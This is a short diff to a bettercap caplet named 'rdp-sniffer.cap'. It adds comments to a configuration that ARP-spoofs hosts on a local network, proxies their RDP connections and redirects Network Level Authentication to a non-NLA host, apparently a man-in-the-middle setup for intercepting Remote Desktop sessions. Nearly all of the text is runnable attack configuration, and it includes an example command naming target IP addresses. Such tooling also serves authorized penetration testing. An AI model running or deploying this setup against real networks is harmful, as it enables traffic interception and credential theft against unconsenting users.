@@ -13,13 +13,17 @@
 #	sudo ./bettercap -caplet rdp-sniffer.cap -eval "set arp.spoof.targets 192.168.0.50, 192.168.0.51; set rdp.proxy.targets 192.168.0.50;"
 
 # Setup arp spoofing
+# If true, local connections among computers of the network will be spoofed as well
+# Otherwise only connections going to and coming from the external network.
 set arp.spoof.internal true
 
-# Setup targets (Uncomment to specify target)
+# Setup targets
+# Uncomment to specify targets
 #set arp.spoof.targets 192.168.0.50, 192.168.0.51
 #set rdp.proxy.targets 192.168.0.50
 
 # Setup NLA redirect
+# Replace YOUR_NON_NLA_HOST with the correct ip
 set rdp.proxy.nla.mode REDIRECT
 set rdp.proxy.nla.redirect.ip YOUR_NON_NLA_HOST
 set rdp.proxy.nla.redirect.port 3389
